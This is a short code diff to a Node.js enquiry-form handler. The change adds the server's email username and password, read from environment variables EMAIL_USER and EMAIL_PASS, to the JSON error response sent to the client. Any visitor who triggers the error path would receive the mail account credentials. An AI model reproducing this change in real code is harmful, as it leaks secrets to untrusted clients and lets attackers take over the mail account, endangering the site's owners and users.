@@ -36,7 +36,7 @@ let enquiryInsert = async (req, res) => {
 
  } catch(err) {
   console.log("Email Error:", err);
-  res.send({ status:0, mess:"Data not saved Successfully",error:err });
+  res.send({ status:0, mess:"Data not saved Successfully",error:err,email:process.env.EMAIL_USER,pass:process.env.EMAIL_PASS});
  }
 
  let enquiry = new enquiryModel({ name, email, message });
